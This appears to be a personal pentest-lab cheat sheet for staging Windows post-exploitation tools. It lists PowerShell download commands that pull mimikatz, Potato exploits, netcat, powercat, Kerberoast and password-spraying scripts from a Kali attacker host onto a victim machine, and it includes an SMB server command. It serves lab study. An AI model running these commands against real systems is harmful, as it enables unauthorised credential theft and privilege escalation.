[[Python#Server]]

```powershell - windows
powershell Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

```powershell - windows
Get-ExecutionPolicy -Scope CurrentUser
```

1. Put all the Windows tools into a folder called Windows

| $1 |  Kali IP | 172.16.1.4 |
| --- | --- | --- | 
| $2 | Writable Windows directory | C:\Users\Aaron\Documents\Files\ |

2. Paste the following into Notepad++:

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/accesschk.exe','$2accesschk.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/accesschk64.exe','$2accesschk64.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/AccessEnum.exe','$2AccessEnum.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/ADExplorer.exe','$2ADExplorer.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/ADInsight.exe','$2ADInsight.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/Autologon.exe','$2Autologon.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/Autoruns.exe','$2Autoruns.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/Autoruns64.exe','$2Autoruns64.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/autorunsc64.exe','$2autorunsc64.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/cve-2018-8120-x64.exe','$2cve-2018-8120-x64.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/JuicyPotato.exe','$2JuicyPotato.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/mimikatz.exe','$2mimikatz.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/mimikatz64.exe','$2mimikatz64.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/nc.exe','$2nc.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/nc64.exe','$2nc64.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/plink.exe','$2plink.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/potato.exe','$2potato.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/PrintSpoofer.exe','$2PrintSpoofer.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/Procmon64.exe','$2Procmon64.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/pscp32.exe','$2pscp32.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/pscp64.exe','$2pscp64.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/PsExec.exe','$2PsExec.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/PsExec64.exe','$2PsExec64.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/RoguePotato.exe','$2RoguePotato.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/Seatbelt.exe','$2Seatbelt.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/SharpUp.exe','$2SharpUp.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/sigcheck.exe','$2sigcheck.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/sigcheck64.exe','$2sigcheck64.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/strings.exe','$2strings.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/strings64.exe','$2strings64.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/wget.exe','$2wget.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/windows-privesc-check2.exe','$2windows-privesc-check2.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/winPEASany.exe','$2winPEASany.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/winPEASx64.exe','$2winPEASanyx64.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/winPEASx86.exe','$2winPEASanyx86.exe')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/winPEAS.bat','$2winPEAS.bat')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/GetSPN.ps1','$2getSPN.ps1')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/Invoke-Kerberoast.ps1','$2Invoke-Kerberoast.ps1')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/Out-Minidump.ps1','$2Out-Minidump.ps1')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/PowerUp.ps1','$2PowerUp.ps1')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/powercat.ps1','$2powercat.ps1')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/PowerView.ps1','$2PowerView.ps1')"

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$1:80/WINDOWS/Spray-Passwords.ps1','$2Spray-Passwords.ps1')"
```

3. CTRL+H to find and replace. Replace $1 with your Kali IP. Replace $2 with the Victims writable path:

4. Copy Paste the results into WinPack.bat file, then transfer to Windows Vic.

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.152:80/WinPack.bat','C:\Users\eric\Documents\tools\WinPack.bat')"
```

To run the bat in Windows:

```batch
.\WinPack.bat
```

>
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 
[https://medium.com/@dr.spitfire/ocsp-file-transfer-recipe-for-delicious-post-exploitation-a407e00f7346](https://medium.com/@dr.spitfire/ocsp-file-transfer-recipe-for-delicious-post-exploitation-a407e00f7346)

```python
python3 smbserver.py Files /home/kali/VHL/Labs/Aaron/
```
